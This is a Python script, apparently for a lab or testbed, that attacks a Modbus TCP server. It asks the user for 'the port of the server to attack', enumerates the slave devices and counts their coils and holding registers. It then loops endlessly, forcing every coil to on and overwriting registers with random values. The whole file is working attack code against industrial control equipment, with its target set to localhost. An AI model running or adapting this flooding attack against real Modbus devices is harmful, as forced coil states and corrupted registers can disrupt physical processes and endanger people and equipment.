import asyncio
import pymodbus.client as modbusClient
import time
import random

def clientinput():
    while True:
        try:
            port = int(input("Enter in the port of the server to attack: "))
            return port
        except:
            print("please enter in an integer")

def setup(serverport,ip):
    client = modbusClient.AsyncModbusTcpClient(host=ip,port=serverport)
    return client

async def coil_mag(client,slave):
    run = True
    j = 1
    while run:
        await client.connect()
        coil = await client.read_coils(0,j,slave=slave)
        if coil.isError():
            print("There are ",j," coils with this slave device")
            run = False
        else:
            j += 1
    return j

async def register_mag(client,slave):
    run = True
    i = 1
    while run:
        await client.connect()
        register = await client.read_holding_registers(0,i,slave=slave)
        if register.isError():
            print("There are ",i," registers with this slave device")
            run = False
        else:
            i += 1
    return i

async def slave_mag(client):
    slave_count = 0
    coils = []
    registers = []
    while slave_count < 2:
        await client.connect()
        assert client.connected
        response = await client.read_coils(0,1,slave=slave_count)
        if not response.isError():
            print("1 Slave with id: ",slave_count)
            coil = await coil_mag(client,slave_count)
            register = await register_mag(client,slave_count)
            slave_count += 1
            coils.append(coil)
            registers.append(register)
        else:
            print("Modbus Error")
        #time.sleep(1)
    print("There are a total of ",slave_count," slaves")
    return slave_count, coils, registers

async def attack(client,slaves):
    await client.connect()
    assert client.connected
    print("Flooding coils and registers.....")
    while True:
        for i in range(0,slaves[0]):
            if slaves[1][i]-1 > 0:
                await client.write_coils(0,[1]*(slaves[1][i]-1),slave=i)
            if slaves[2][i]-1 > 0:
                a = random.randint(0,65535)
                await client.write_registers(0,[a]*(slaves[2][i]-1),slave=i)
        

async def main():
    ip = "127.0.0.1"
    port = clientinput()
    client = setup(port,ip)
    slave_and_coils = await slave_mag(client)
    await attack(client,slave_and_coils)

if __name__== "__main__":
    asyncio.run(main())


                
                                                     

                                                     
                                                     
